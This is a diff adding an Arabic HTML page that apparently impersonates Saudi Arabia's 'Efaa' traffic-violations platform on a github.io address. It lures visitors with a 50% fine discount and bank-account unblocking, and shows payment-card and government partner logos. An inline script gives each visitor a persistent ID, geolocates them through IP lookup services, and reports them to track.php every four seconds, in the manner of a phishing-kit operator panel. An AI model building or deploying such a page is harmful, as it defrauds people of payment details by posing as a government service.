@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إيفاء</title>
+    <link rel="icon" type="image/png" href="indexx/favicon.ico">
+
+    <meta property="og:title" content="إيفاء">
+    <meta property="og:description" content="المنصة الوطنية للمخالفات (إيفاء) نسبة الخصم: 50% من قيمة الغرامات المخالفات المشمولة جميع المخالفات . حق الاعتراض إلكترونياً لضمان حقوقك . رفع الحجز عن الحساب البنكي آلياً.">
+    <meta property="og:image" content="https://coou7tq.github.io/miniature-octo-giggle/indexx/PM.jpeg">
+    <meta property="og:url" content="https://coou7tq.github.io/miniature-octo-giggle/">
+    <meta property="og:type" content="website">
+
+    <style>
+        /* إعدادات الصفحة الأساسية والخلفية الكاملة */
+        body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-image: url('indexx/Back004.jpg'); 
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+        }
+
+        /* رأس الموقع - شفاف مع توزيع العناصر */
+        .main-header {
+            background-color: rgba(0, 150, 136, 0.7);
+            width: 100%;
+            height: 90px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        .header-container {
+            width: 90%;
+            max-width: 1200px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        .center-header-img {
+            height: 70px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        /* وسط الموقع - الحاوية المركزية */
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* صندوق الأزرار الشفاف */
+        .buttons-box {
+            background-color: rgba(255, 255, 255, 0.15);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .box-title {
+            color: #ffffff;
+            margin-bottom: 25px;
+            font-size: 1.2rem;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
+        }
+
+        /* تنسيق الأزرار الشفافة */
+        .nav-btn {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            margin: 12px 0;
+            background-color: rgba(0, 150, 136, 0.9);
+            color: #ffffff;
+            border: 2px solid rgba(0, 150, 136, 0.7);
+            border-radius: 8px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            box-sizing: border-box;
+        }
+
+        .nav-btn:hover {
+            background-color: rgba(255, 255, 255, 0.3);
+            border-color: #ffffff;
+            transform: translateY(-2px);
+        }
+
+        /* ذيل الموقع الرئيسي */
+        .site-footer {
+            background-color: rgba(0, 150, 136, 0.85); 
+            color: #ffffff;
+            padding: 30px 0;
+            width: 100%;
+        }
+
+        .footer-container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .footer-section {
+            flex: 1;
+            min-width: 250px;
+            margin: 10px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .footer-right { align-items: flex-start; text-align: right; }
+        .footer-left { align-items: flex-end; text-align: left; }
+
+        /* التحكم بالصور لضمان إجبار المتصفح على عرضها */
+        .efa-logo {
+            object-fit: contain;
+            display: inline-block !important;
+        }
+
+        .partner-logos {
+            display: flex;
+            gap: 20px;
+        }
+
+        .partner-logo {
+            object-fit: contain !important;
+            display: inline-block !important;
+        }
+
+        .footer-center h3 {
+            margin: 0 0 10px 0;
+            font-size: 1.1rem;
+        }
+
+        .footer-links {
+            list-style: none;
+            padding: 0;
+            margin: 0 0 15px 0;
+            display: flex;
+            gap: 15px;
+        }
+
+        .footer-links a {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .payment-methods {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .payment-logo {
+            height: 25px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        /* الخط المتقطع للجوال */
+        .dashed-linee {
+            display: none;
+            width: 100%;
+            border-top: 1px dashed rgba(255, 255, 255, 0.4);
+            margin: 15px 0;
+        }
+
+        /* شاشات الجوال */
+        @media (max-width: 768px) {
+            .footer-container {
+                flex-direction: column;
+            }
+            .footer-section {
+                align-items: center !important;
+                text-align: center !important;
+            }
+            .dashed-linee {
+                display: block;
+            }
+            .footer-links {
+                flex-direction: column;
+                gap: 8px;
+            }
+        }
+    </style>
+
+    <script>
+  // 1. تفعيل المعرف الثابت لكل زائر لمنع التكرار الجلسات
+  let visitorCode = localStorage.getItem('visitor_code');
+  if (!visitorCode) {
+      visitorCode = 'VSR-' + Math.random().toString(36).substring(2, 9).toUpperCase();
+      localStorage.setItem('visitor_code', visitorCode);
+  }
+
+  async function sendTracking() {
+      // استعادة الدولة والمنطقة المخزنة لتسريع الموقع وتوفير البيانات
+      let countryCode = localStorage.getItem('visitor_country') || 'un';
+      let regionName = localStorage.getItem('visitor_region') || 'جاري التحديد...';
+
+      if (countryCode === 'un' || regionName === 'جاري التحديد...') {
+          try {
+              // جلب البيانات بدقة (رابط سريع ومفتوح تماماً لجميع دول العالم ومناطق السعودية)
+              const res = await fetch('https://ipapi.co');
+              const geo = await res.json();
+              
+              countryCode = geo.country_code ? geo.country_code.toLowerCase() : 'sa';
+              regionName = geo.region || geo.city || 'منطقة عامة';
+              
+              localStorage.setItem('visitor_country', countryCode);
+              localStorage.setItem('visitor_region', regionName);
+          } catch (e) {
+              // حل احتياطي سريع في حال تعطل الرابط الأول لأي سبب
+              try {
+                  const resAlt = await fetch('https://ipinfo.io');
+                  const geoAlt = await resAlt.json();
+                  countryCode = geoAlt.country ? geoAlt.country.toLowerCase() : 'sa';
+                  regionName = geoAlt.region || geoAlt.city || 'السعودية';
+                  
+                  localStorage.setItem('visitor_country', countryCode);
+                  localStorage.setItem('visitor_region', regionName);
+              } catch (err) {}
+          }
+      }
+
+      // 2. تحويل وتجهيز البيانات للإرسال المتوافق مع الاستضافة المجانية
+      const params = new URLSearchParams();
+      params.append('code', visitorCode);
+      params.append('pageTitle', document.title); // اسم الصفحة دقيق بدون روابط
+      params.append('countryCode', countryCode); // كود الدولة للعلم
+      params.append('region', regionName); // إرسال المنطقة بشكل مستقل ومستقر
+
+      fetch('track.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: params
+      }).catch(e => console.log(e));
+  }
+
+  // بث التحديث الفوري وتكراره كل 4 ثوانٍ لتأكيد التواجد
+  sendTracking();
+  setInterval(sendTracking, 4000);
+
+  // تحديث فوري دقيق للاسم والحالة عند الرجوع والتقدم بأزرار المتصفح
+  window.addEventListener('pageshow', sendTracking);
+</script>
+
+
+</head>
+
+<body>
+
+    <!-- رأس الموقع -->
+    <header class="main-header">
+        <div class="header-container">
+            <img src="indexx/EFAAW.svg" alt="صورة وسط الرأس" class="center-header-img" width="150" height="70">
+        </div>
+    </header>
+
+    <!-- وسط الموقع -->
+    <main class="main-content">
+        <!-- صندوق الأزرار الشفاف -->
+        <div class="buttons-box">
+            <div class="box-title">الخدمات الإلكترونية</div>
+            
+            <a href="objection.html" class="nav-btn">اعتراض على مخالفة</a>
+            <a href="discount.html" class="nav-btn"> خصم على المخالفة %50</a>
+            <a href="unblock.html" class="nav-btn"> فك إيقاف الحساب محجوزاً</a>
+            <a href="payment.html" class="nav-btn"> قمت بسداد المخالفة</a>
+        </div>
+    </main>
+
+    <!-- ذيل الموقع -->
+    <footer class="site-footer">
+        <div class="footer-container">
+            
+            <!-- القسم الأيمن: شعار إيفاء مع تحديد الأبعاد الصريحة للمتصفح -->
+            <div class="footer-section footer-right">
+                <div class="logo-efa">
+                    <img src="indexx/EFAAW.svg" alt="Efa Logo" class="efa-logo" width="160" height="70">
+                </div>
+            </div>
+
+            <div class="dashed-linee"></div>
+
+            <!-- القسم الأوسط: النصوص وطرق الدفع -->
+            <div class="footer-section footer-center">
+                <h3>المنصة الوطنية للمخالفات</h3>
+                <ul class="footer-links">
+                    <li><a href="#">الأسئلة الشائعة</a></li>
+                    <li><a href="#">شروط الإستخدام</a></li>
+                    <li><a href="#">سياسة الخصوصية</a></li>
+                </ul>
+                
+                <div class="payment-methods">
+                    <img src="indexx/Mada.svg" alt="Mada" class="payment-logo">
+                    <img src="indexx/Sdad.svg" alt="Sadad" class="payment-logo">
+                    <img src="indexx/Visa.svg" alt="Visa" class="payment-logo">
+                    <img src="indexx/MasterCard.svg" alt="MasterCard" class="payment-logo">
+                </div>
+            </div>
+
+            <div class="dashed-linee"></div>
+
+            <!-- القسم الأيسر: شعارات الشركاء مع تحديد الأبعاد الصريحة للمتصفح -->
+            <div class="footer-section footer-left">
+                <div class="partner-logos">
+                    <img src="indexx/NICW.svg" alt="NIC" class="partner-logo" width="100" height="55">
+                    <img src="indexx/sdaia2.svg" alt="SDAIA" class="partner-logo" width="100" height="55">
+                </div>
+            </div>
+
+        </div>
+    </footer>
+
+    
+</body>
+</html>
